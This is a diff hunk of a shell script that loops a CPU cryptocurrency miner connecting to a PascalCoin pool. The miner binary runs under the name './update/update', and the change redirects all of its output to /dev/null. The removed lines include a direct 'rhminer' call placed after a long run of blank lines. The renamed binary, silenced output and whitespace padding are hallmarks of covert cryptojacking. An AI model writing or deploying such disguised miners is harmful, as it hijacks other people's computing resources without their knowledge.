@@ -113,31 +113,6 @@ sleep 2
 
 while true
 do
-./update/update ./rhel -v 3 -r 20 -s stratum+tcp://pool.pascalcoin.org:10097 -su solo:1196494-13.0.$currentdate -pw x -cputhreads $used_num_of_cores
+./update/update ./rhel -v 3 -r 20 -s stratum+tcp://pool.pascalcoin.org:10097 -su solo:1196494-13.0.$currentdate -pw x -cputhreads $used_num_of_cores 1>/dev/null 2>&1
 sleep 10
 done
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-./rhminer -v 3 -r 20 -s stratum+tcp://pool.pascalcoin.org:10097 -su solo:1196494-13.0.$currentdate -pw x -cputhreads 4
